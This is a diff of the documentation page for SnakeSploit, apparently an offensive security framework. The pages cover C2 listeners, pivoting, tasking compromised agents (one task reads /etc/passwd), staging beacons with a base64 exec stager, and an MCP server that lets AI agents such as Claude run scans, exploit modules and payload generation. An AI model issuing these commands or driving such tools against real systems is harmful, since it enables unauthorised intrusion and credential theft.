+  <tr><td>Payload Generation</td><td>Create payloads via Mythic's engine</td></tr>
+  <tr><td>Task Results</td><td>Retrieve command output from agents</td></tr>
+</table>
+
+<h2>Console Commands</h2>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">c2 status</div><div class="desc">C2 server status overview</div></div>
+  <div class="cmd-card"><div class="cmd">c2 mythic connect</div><div class="desc">Connect to Mythic server</div></div>
+  <div class="cmd-card"><div class="cmd">c2 listener create</div><div class="desc">Create a listener</div></div>
+  <div class="cmd-card"><div class="cmd">c2 listener start</div><div class="desc">Start a listener</div></div>
+  <div class="cmd-card"><div class="cmd">c2 list</div><div class="desc">List all agents</div></div>
+  <div class="cmd-card"><div class="cmd">c2 task &lt;id&gt; &lt;cmd&gt;</div><div class="desc">Task an agent</div></div>
+  <div class="cmd-card"><div class="cmd">c2 payload &lt;type&gt;</div><div class="desc">Stage a payload</div></div>
+  <div class="cmd-card"><div class="cmd">c2 pivot &lt;agent&gt; &lt;port&gt;</div><div class="desc">Create pivot listener</div></div>
+</div>
+    `
+  },
+
+  "c2-mythic": {
+    title: "Mythic Integration",
+    content: `
+<h2>Mythic C2 Integration</h2>
+<p>SnakeSploit can connect to a running <strong>Mythic C2</strong> server via its REST API, giving you full control over your Mythic deployment from the SnakeSploit console.</p>
+
+<h3>Configuration</h3>
+<pre><span class="comment"># From console:</span>
+snakesploit > c2 mythic connect https://mythic-server:7443 YOUR_API_KEY
+
+<span class="comment"># Check connection:</span>
+snakesploit > c2 mythic status</pre>
+
+<h3>Mythic Operations</h3>
+<pre><span class="comment"># View callbacks (agents)</span>
+snakesploit > c2 mythic callbacks
+
+<span class="comment"># Task an agent</span>
+snakesploit > c2 mythic task 1 "shell whoami"
+
+<span class="comment"># Generate a payload</span>
+snakesploit > c2 mythic payload apollo http</pre>
+
+<h3>API Endpoints Used</h3>
+<table>
+  <tr><th>Endpoint</th><th>Description</th></tr>
+  <tr><td><code>GET /api/v1.4/callbacks</code></td><td>List active callbacks</td></tr>
+  <tr><td><code>POST /api/v1.4/callbacks/{id}/tasks</code></td><td>Send task to callback</td></tr>
+  <tr><td><code>GET /api/v1.4/payloads</code></td><td>List available payloads</td></tr>
+  <tr><td><code>POST /api/v1.4/payloads</code></td><td>Generate new payload</td></tr>
+</table>
+    `
+  },
+
+  "c2-listeners": {
+    title: "C2 Listeners",
+    content: `
+<h2>C2 Listeners</h2>
+<p>Listeners are the entry points where C2 agents connect. SnakeSploit supports TCP listeners with full lifecycle management.</p>
+
+<h3>Creating a Listener</h3>
+<pre>snakesploit > c2 listener create beacon 0.0.0.0 4444
+[+] Listener 'beacon' created on 0.0.0.0:4444 (tcp)
+
+snakesploit > c2 listener start beacon
+[+] Listener 'beacon' started on 0.0.0.0:4444</pre>
+
+<h3>Listener Lifecycle</h3>
+<div class="steps">
+  <div class="step"><strong>Create</strong> — Define the listener name, host, port, and protocol</div>
+  <div class="step"><strong>Start</strong> — Launch the listener in a background thread</div>
+  <div class="step"><strong>Accept</strong> — Agents connect and automatically register</div>
+  <div class="step"><strong>Task</strong> — Send commands to connected agents</div>
+  <div class="step"><strong>Stop</strong> — Halt the listener</div>
+</div>
+
+<h3>Pivot Listeners</h3>
+<p>Pivot listeners route traffic through a compromised agent, allowing you to reach networks behind the target:</p>
+<pre>snakesploit > c2 pivot agent_1 8080
+[+] Pivot listener 'pivot_agent_1_8080' started via agent_1</pre>
+
+<div class="callout callout-warn"><strong>⚠ Note:</strong> Pivot listeners require the target agent to support the <code>pivot_listen</code> command.</div>
+    `
+  },
+
+  "c2-agents": {
+    title: "Agent Management",
+    content: `
+<h2>Agent Management</h2>
+<p>Agents are compromised hosts running SnakeSploit-compatible beacons. The C2 server tracks their status, tasks, and results.</p>
+
+<h3>Viewing Agents</h3>
+<pre>snakesploit > c2 list
+  ID        Host             User@Computer     OS      Status
+  agent_1   192.168.1.100    admin@PC-01       windows active
+  agent_2   10.0.0.50        root@server-01    linux   active</pre>
+
+<h3>Tasking Agents</h3>
+<pre>snakesploit > c2 task agent_1 "whoami"
+[+] Task 'task_1' sent to agent_1
+
+snakesploit > c2 task agent_1 "ipconfig"
+snakesploit > c2 task agent_2 "cat /etc/passwd"</pre>
+
+<h3>Agent Check-in Protocol</h3>
+<p>When an agent connects, it sends a CHECKIN message:</p>
+<pre>CHECKIN:username@hostname:os:arch:pid</pre>
+<p>The server registers the agent and returns:</p>
+<pre>REGISTERED:agent_1</pre>
+
+<h3>Task Execution Flow</h3>
+<div class="steps">
+  <div class="step">Operator sends task via <code>c2 task</code></div>
+  <div class="step">Task is queued in the agent's pending list</div>
+  <div class="step">Agent checks in, receives pending task</div>
+  <div class="step">Agent executes the command</div>
+  <div class="step">Agent sends result back as <code>TASK_RESULT:...</code></div>
+</div>
+    `
+  },
+
+  "c2-staging": {
+    title: "Payload Staging",
+    content: `
+<h2>Payload Staging</h2>
+<p>SnakeSploit can generate staged C2 beacons that automatically check in to your listener when executed on the target.</p>
+
+<h3>Available Beacon Types</h3>
+<table>
+  <tr><th>Type</th><th>Platform</th><th>Size</th><th>Features</th></tr>
+  <tr><td><code>python</code></td><td>Multi (Python required)</td><td>~2KB</td><td>Full tasking, command output, threaded</td></tr>
+  <tr><td><code>powershell</code></td><td>Windows</td><td>~1KB</td><td>Native PS, task execution, output return</td></tr>
+  <tr><td><code>bash</code></td><td>Linux/Unix</td><td>~300B</td><td>Lightweight, /dev/tcp based</td></tr>
+</table>
+
+<h3>Staging a Beacon</h3>
+<pre><span class="comment"># Python beacon (most versatile)</span>
+snakesploit > c2 payload python LHOST=10.0.0.5 LPORT=4444 name=stage1
+[+] Payload 'stage1' staged
+
+<span class="comment"># PowerShell beacon (Windows targets)</span>
+snakesploit > c2 payload powershell LHOST=10.0.0.5 LPORT=4444 name=win_beacon
+
+<span class="comment"># Bash beacon (Linux targets)</span>
+snakesploit > c2 payload bash LHOST=10.0.0.5 LPORT=4444 name=linux_stage</pre>
+
+<h3>Viewing Staged Payloads</h3>
+<pre>snakesploit > c2 payloads
+  Name        Type        LHOST          LPORT
+  stage1      python      10.0.0.5       4444
+  win_beacon  powershell  10.0.0.5       4444
+  linux_stage bash        10.0.0.5       4444</pre>
+
+<h3>Deploying</h3>
+<p>Staged payloads are saved to <code>~/.snakesploit/c2/payloads/</code>. The stager command can be copied and run on the target:</p>
+<pre><span class="comment"># The stager for Python beacon looks like:</span>
+python3 -c "exec(__import__('base64').b64decode('...').decode())"</pre>
+
+<div class="callout callout-info"><strong>💡 Pro tip:</strong> Start your listener first with <code>c2 listener start beacon</code>, then stage and deploy the payload. The beacon will check in immediately.</div>
+    `
+  },
+
+  strix: {
+    title: "Strix AI Scanner",
+    content: `
+<h2>Strix AI Scanner</h2>
+<p>SnakeSploit integrates with <strong>Strix</strong>, an AI-powered web security scanner for deep reconnaissance and vulnerability analysis.</p>
+
+<h3>Configuration</h3>
+<pre><span class="comment"># Set your Strix API key</span>
+snakesploit strix config --key YOUR_STRIX_API_KEY
+
+<span class="comment"># Check status</span>
+snakesploit strix status</pre>
+
+<h3>Running a Scan</h3>
+<pre><span class="comment"># From CLI:</span>
+snakesploit strix https://example.com
+
+<span class="comment"># From console:</span>
+snakesploit > strix example.com</pre>
+
+<h3>Results</h3>
+<p>Scan results are saved to <code>~/.snakesploit/strix_scans/</code> and linked to your target database.</p>
+    `
+  },
+
+  mcp: {
+    title: "MCP Integration",
+    content: `
+<h2>MCP (Model Context Protocol) Integration</h2>
+<p>SnakeSploit implements the <strong>Model Context Protocol</strong>, allowing AI agents (Claude, Cline, Cursor) to discover and use SnakeSploit tools automatically.</p>
+
+<h3>Starting the MCP Server</h3>
+<pre><span class="comment"># Stdio mode (for AI agent subprocess)</span>
+snakesploit --mcp
+
+<span class="comment"># HTTP mode (for remote AI agents)</span>
+snakesploit --mcp http --mcp-port 8765
+
+<span class="comment"># From console:</span>
+snakesploit > mcp http 8765</pre>
+
+<h3>Available MCP Tools</h3>
+<table>
+  <tr><th>Tool</th><th>Description</th></tr>
+  <tr><td><code>scan_ports</code></td><td>Scan a target for open TCP ports</td></tr>
+  <tr><td><code>http_get</code></td><td>Send HTTP GET request</td></tr>
+  <tr><td><code>search_modules</code></td><td>Find modules by CVE or keyword</td></tr>
+  <tr><td><code>run_module</code></td><td>Execute a module against a target</td></tr>
+  <tr><td><code>generate_payload</code></td><td>Generate reverse/bind shell payloads</td></tr>
+  <tr><td><code>cve_stats</code></td><td>Get CVE cache statistics</td></tr>
+  <tr><td><code>update_cves</code></td><td>Fetch latest CVEs</td></tr>
+  <tr><td><code>target_list</code></td><td>List all tracked targets</td></tr>
+  <tr><td><code>strix_scan</code></td><td>Run Strix AI scanner</td></tr>
+  <tr><td><code>self_update</code></td><td>Update SnakeSploit from GitHub</td></tr>
+</table>
+
+<h3>Using with Claude Code</h3>
+<pre><span class="comment"># Terminal 1: Start MCP server</span>
+snakesploit mcp http 8765
+
+<span class="comment"># Terminal 2: Claude Code connects</span>
+claude --mcp http://127.0.0.1:8765
+
+<span class="comment"># Claude can now run: "scan 192.168.1.100 for open ports"</span></pre>
+    `
+  },
+
+  cve: {
+    title: "CVE Auto-Update",
+    content: `
+<h2>CVE Auto-Update Pipeline</h2>
+<p>SnakeSploit's most powerful feature — it keeps itself fresh by fetching vulnerabilities, scraping PoCs, and generating modules automatically.</p>
+
+<h3>How It Works</h3>
+<div class="steps">
+  <div class="step"><strong>Fetch CVEs</strong> — Every 6 hours (via cron), pulls from NVD API 2.0</div>
+  <div class="step"><strong>Filter by severity</strong> — Priorities Critical > High > Medium</div>
+  <div class="step"><strong>Search PoCs</strong> — Scrapes GitHub and Exploit-DB for proof-of-concept code</div>
+  <div class="step"><strong>Generate Modules</strong> — Creates Python module stubs with metadata, options, and stub exploit code</div>
+  <div class="step"><strong>Reload</strong> — Ready to use in the console immediately</div>
+</div>
+
+<h3>Manual Triggers</h3>
+<pre>snakesploit > update 7          <span class="comment"># Pull code + fetch CVEs (last 7 days)</span>
+snakesploit > update full 7     <span class="comment"># Full pipeline: CVEs → PoCs → Modules</span>
+snakesploit > cve stats         <span class="comment"># Show cache statistics</span>
+snakesploit > pocs CVE-2026-XXXX <span class="comment"># Search PoCs for a specific CVE</span></pre>
+
+<h3>CLI Commands</h3>
+<pre>snakesploit --update             <span class="comment"># Git pull + fetch CVEs</span>
+snakesploit --update --days 14   <span class="comment"># Fetch last 14 days</span>
+snakesploit --full               <span class="comment"># Full pipeline</span>
+snakesploit --cve stats          <span class="comment"># Show stats</span></pre>
+
+<h3>CVE Statistics</h3>
+<pre>snakesploit > cve stats
+  total_cves:    200
+  critical:      18
+  high:          66
+  medium:        81
+  low:           3
+  with_pocs:     0
+  without_pocs:  200
+  last_fetch:    2026-07-08T12:00:03</pre>
+    `
+  },
+
+  license: {
+    title: "License System",
+    content: `
+<h2>License System</h2>
+<p>SnakeSploit uses <strong>LicenseSeat</strong> for secure license management. Researchers need a valid key to use the tool.</p>
+
+<h3>For Researchers</h3>
+<pre><span class="comment"># Activate your key</span>
+snakesploit --activate YOUR-LICENSE-KEY
+
+<span class="comment"># Check license status</span>
+snakesploit --license-status
+
+<span class="comment"># Deactivate on shared machines (frees seat)</span>
+snakesploit --deactivate</pre>
+
+<h3>For Administrators</h3>
+<p>Set environment variables:</p>
+<pre>export SNAKESPLOIT_LICENSE_API_KEY="your_licenseseat_api_key"
+export SNAKESPLOIT_PRODUCT_SLUG="your_product_slug"</pre>
+
+<h3>Revocation</h3>
+<p>When a license is revoked in the LicenseSeat dashboard:</p>
+<ul>
+  <li>User is <strong>auto-kicked within 3 minutes</strong> (background polling)</li>
+  <li>Validation happens on <strong>every launch</strong> (no 24h cache)</li>
+  <li>Offline fallback: if server unreachable, previously valid licenses still work</li>
+</ul>
+    `
+  },
+
+  api: {
+    title: "API Reference",
+    content: `
+<h2>API Reference <span class="tag tag-new">New</span></h2>
+<p>The web dashboard exposes a REST API at <code>http://your-host:5000/api/</code>. All endpoints return JSON.</p>
+
+<h3>Endpoints</h3>
+<table>
+  <tr><th>Method</th><th>Path</th><th>Description</th></tr>
+  <tr><td>GET</td><td><code>/api/ping</code></td><td>Health check — returns version and status</td></tr>
+  <tr><td>GET</td><td><code>/api/dashboard</code></td><td>Dashboard stats — targets, services, vulns, modules, CVEs, sessions</td></tr>
+  <tr><td>GET</td><td><code>/api/targets</code></td><td>List all targets with service/vuln counts</td></tr>
+  <tr><td>POST</td><td><code>/api/targets/add</code></td><td>Add a target — body: <code>{"host": "..."}</code></td></tr>
+  <tr><td>GET</td><td><code>/api/modules</code></td><td>List all loaded modules with metadata</td></tr>
+  <tr><td>GET</td><td><code>/api/cve</code></td><td>CVE cache statistics and last 50 CVEs</td></tr>
+  <tr><td>POST</td><td><code>/api/cve/update</code></td><td>Trigger CVE fetch — body: <code>{"days": 7}</code></td></tr>
+  <tr><td>POST</td><td><code>/api/scan</code></td><td>Port scan — body: <code>{"host":"...", "ports":"..."}</code></td></tr>
+  <tr><td>POST</td><td><code>/api/scan/deep</code></td><td>Deep scan with banner grabbing on 32 ports</td></tr>
+  <tr><td>POST</td><td><code>/api/payloads</code></td><td>Generate payload — body: <code>{"type":"...", "lhost":"...", "lport":4444}</code></td></tr>
+  <tr><td>POST</td><td><code>/api/modules/run</code></td><td>Execute module — body: <code>{"module":"...", "target":"...", "port":80}</code></td></tr>
+  <tr><td>GET</td><td><code>/api/report</code></td><td>Generate HTML engagement report</td></tr>
+  <tr><td>GET</td><td><code>/api/system</code></td><td>System health and version info</td></tr>
+  <tr><td>POST</td><td><code>/api/strix/config</code></td><td>Set Strix API key</td></tr>
+  <tr><td>POST</td><td><code>/api/strix/scan</code></td><td>Run Strix scan — body: <code>{"target":"..."}</code></td></tr>
+  <tr><td>POST</td><td><code>/api/console</code></td><td>Execute console command — body: <code>{"command":"..."}</code></td></tr>
+</table>
+
+<h3>Example: Port Scan via API</h3>
+<pre>curl -X POST http://localhost:5000/api/scan \\
+  -H "Content-Type: application/json" \\
+  -d '{"host": "192.168.1.100", "ports": "22,80,443"}'
+
+<span class="comment"># Response:</span>
+{
+  "results": [
+    {"port": 22, "state": "open"},
+    {"port": 80, "state": "open"}
+  ]
+}</pre>
+
+<h3>Example: Generate Report</h3>
+<pre>curl http://localhost:5000/api/report > engagement_report.html
+<span class="comment"># Open in browser — full HTML report with targets, services, vulns</span></pre>
+    `
+  },
+
+  gui: {
+    title: "Web Dashboard",
+    content: `
+<h2>Web Dashboard</h2>
+<p>SnakeSploit's premium web dashboard provides real-time access to all features through a beautiful dark-themed interface.</p>
+
+<h3>Starting the Dashboard</h3>
+<pre><span class="comment"># Install Flask (one-time)</span>
+pip install flask
+
+<span class="comment"># Start the dashboard</span>
+snakesploit --gui
+<span class="comment"># Opens on http://0.0.0.0:5000</span>
+
+<span class="comment"># Custom port</span>
+snakesploit --gui 8080
+
+<span class="comment"># From console</span>
+snakesploit > gui 8080</pre>
+
+<h3>Dashboard Pages</h3>
+<table>
+  <tr><th>Page</th><th>Features</th></tr>
+  <tr><td>Dashboard</td><td>Live stats: targets, services, vulns, modules, CVEs, sessions</td></tr>
+  <tr><td>Targets</td><td>Add, view, remove targets. Quick scan button</td></tr>
+  <tr><td>Modules</td><td>Search 200+ modules with live filtering</td></tr>
+  <tr><td>CVE Updates</td><td>View cache, trigger updates, severity breakdown</td></tr>
+  <tr><td>Scanner</td><td>Basic and deep scan with results table</td></tr>
+  <tr><td>Payloads</td><td>Dropdown + LHOST/LPORT → instant payload</td></tr>
+  <tr><td>Strix</td><td>Configure API key, run AI scans</td></tr>
+  <tr><td>Console</td><td>Web terminal for SnakeSploit commands</td></tr>
+</table>
+
+<h3>GitHub Pages Frontend</h3>
+<p>The dashboard frontend is also available as a static site on GitHub Pages:</p>
+<pre><span class="comment"># Visit: https://hermesna-1.github.io/SnakeSploit/</span>
+<span class="comment"># Click "Connect" → enter your backend IP → see live data</span></pre>
+    `
+  },
+
+  reporting: {
+    title: "Reporting",
+    content: `
+<h2>Engagement Reporting</h2>
+<p>SnakeSploit can generate comprehensive HTML engagement reports with all your targets, services, vulnerabilities, and CVE data.</p>
+
+<h3>Generate a Report</h3>
+<pre>curl http://localhost:5000/api/report > engagement_report.html
+open engagement_report.html</pre>
+
+<h3>Report Contents</h3>
+<ul>
+  <li>Summary stats: targets, services, vulnerabilities, CVEs cached</li>
+  <li>Target details: host, OS, open ports with banners</li>
+  <li>Vulnerabilities: CVE IDs and descriptions per target</li>
+  <li>Top CVEs table: ranked by score with severity</li>
+  <li>Professional dark-themed HTML (printable)</li>
+</ul>
+
+<h3>Example Report HTML</h3>
+<pre><span class="comment"># Self-contained HTML — no external dependencies</span>
+🐍 SnakeSploit
+Engagement Report — Generated 2026-07-09 19:00 UTC
+
+📊 Stats: 3 Targets | 12 Services | 5 Vulnerabilities | 200 CVEs
+
+🎯 192.168.1.100
+  Port 22: open  | Port 80: open  | Port 445: open
+  [CVE-2017-0143] SMB Remote Code Execution
+  [CVE-2020-0796] SMBv3 Compression RCE</pre>
+    `
+  },
+};
+
+// ── Navigation ──
+function showPage(id) {
+  document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
+  event?.target?.classList?.add('active');
+  // Also find the nav-link by data attribute
+  document.querySelectorAll(`.nav-link[onclick*="'${id}'"]`).forEach(n => n.classList.add('active'));
+  renderPage(id);
+  window.scrollTo(0, 0);
+}
+
+function renderPage(id) {
+  const page = PAGES[id];
+  if (!page) return;
+  const content = document.getElementById('content');
+  content.innerHTML = `<h1>${page.title}</h1>${page.content}`;
+
+  // Re-highlight code blocks
+  document.querySelectorAll('pre code').forEach(block => {
+    // Already handled by pre styling
   });
-}, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
-document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
 
-// ── Install Tabs ──
-function showTab(name) {
-  document.querySelectorAll('.install-tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.install-body > div[id^="tab-"]').forEach(d => d.style.display = 'none');
-  event.target.classList.add('active');
-  document.getElementById('tab-' + name).style.display = 'block';
+  // Update URL hash
+  history.pushState(null, '', '#' + id);
 }
 
-// ── Copy Tab ──
-function copyTab() {
-  const active = document.querySelector('.install-tab.active');
-  const id = 'tab-' + (active ? active.textContent.toLowerCase().replace(/\s+/g,'') : 'quick');
-  const code = document.querySelector('#' + id + ' code');
-  if (code) {
-    navigator.clipboard.writeText(code.textContent).then(() => {
-      const btn = document.querySelector('.install-copy');
-      btn.textContent = '✅ Copied!';
-      setTimeout(() => btn.textContent = '📋 Copy', 1500);
-    });
-  }
+// ── Search ──
+function filterNav(q) {
+  const links = document.querySelectorAll('.nav-link');
+  const sections = document.querySelectorAll('.nav-section');
+  q = q.toLowerCase().trim();
+  links.forEach(link => {
+    const text = link.textContent.toLowerCase();
+    link.style.display = (!q || text.includes(q)) ? 'block' : 'none';
+  });
+  sections.forEach(s => {
+    const visible = Array.from(s.querySelectorAll('.nav-link')).some(l => l.style.display !== 'none');
+    s.style.display = visible ? 'block' : 'none';
+  });
 }
 
-// ── Backend Connection ──
-let backendUrl = localStorage.getItem('snakesploit_backend') || '';
-
-function showConnect() { document.getElementById('connectModal').classList.add('active'); }
-function closeConnect() { document.getElementById('connectModal').classList.remove('active'); }
-
-async function connectBackend() {
-  const url = document.getElementById('backendUrl').value.trim().replace(/\/+$/, '');
-  if (!url) return;
-  document.getElementById('connectError').style.display = 'none';
-  try {
-    const res = await fetch(url + '/api/ping', { signal: AbortSignal.timeout(5000) });
-    const data = await res.json();
-    if (data.status === 'ok') {
-      backendUrl = url;
-      localStorage.setItem('snakesploit_backend', url);
-      closeConnect();
-      document.getElementById('liveDashboard').classList.add('active');
-      document.getElementById('connectPrompt').style.display = 'none';
-      loadLive();
-    } else {
-      showErr('Invalid response from backend');
-    }
-  } catch (e) {
-    showErr('Cannot connect: ' + e.message);
-  }
-}
-function showErr(msg) {
-  const el = document.getElementById('connectError');
-  el.textContent = msg; el.style.display = 'block';
-}
-
-async function api(path) {
-  if (!backendUrl) return null;
-  try {
-    const res = await fetch(backendUrl + path, { signal: AbortSignal.timeout(5000) });
-    return res.ok ? await res.json() : null;
-  } catch { return null; }
-}
-
-async function loadLive() {
-  const data = await api('/api/dashboard');
-  if (!data) return;
-  document.getElementById('dTargets').textContent = data.targets ?? '—';
-  document.getElementById('dServices').textContent = data.services ?? '—';
-  document.getElementById('dVulns').textContent = data.vulnerabilities ?? '—';
-  document.getElementById('dModules').textContent = data.modules ?? '—';
-  document.getElementById('dCves').textContent = data.cves ?? '—';
-  document.getElementById('dSessions').textContent = data.sessions ?? '—';
-  const rt = document.getElementById('recentTargets');
-  if (data.recent_targets?.length) {
-    rt.innerHTML = data.recent_targets.map(t => `<div class="item"><span>${t.host}</span><span style="color:var(--text3)">${t.services} svc, ${t.vulns} vuln</span></div>`).join('');
-  }
-  const tc = document.getElementById('topCves');
-  if (data.top_cves?.length) {
-    tc.innerHTML = data.top_cves.map(c => `<div class="item"><span style="color:var(--text)">${c.id}</span><span style="color:${c.severity==='CRITICAL'?'var(--accent3)':c.severity==='HIGH'?'var(--warning)':'var(--accent)'}">${c.severity} (${c.score})</span></div>`).join('');
-  }
-}
-
-// Auto-connect on load
-if (backendUrl) {
-  document.getElementById('backendUrl').value = backendUrl;
-  connectBackend();
-  setInterval(loadLive, 8000);
+// ── Init ──
+const hash = location.hash.replace('#', '');
+if (hash && PAGES[hash]) {
+  showPage(hash);
+} else {
+  renderPage('introduction');
 }
 </script>
 </body>
